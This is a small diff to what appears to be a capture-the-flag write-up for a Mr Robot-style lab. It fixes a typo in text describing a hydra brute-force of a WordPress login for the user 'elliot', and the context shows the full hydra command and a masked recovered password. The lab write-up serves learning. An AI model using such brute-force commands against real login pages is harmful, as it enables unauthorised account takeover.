@@ -85,7 +85,7 @@ next, I brute forced the login using hydra with the cleaned dictionary and usern
 hydra -l elliot -P clean-dic.txt 10.10.99.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username"
 ```
 
-`hydracode>` found a valid password for elliot!  
+`hydra` found a valid password for elliot!  
 
 ```
 elliot:XXXXXXX
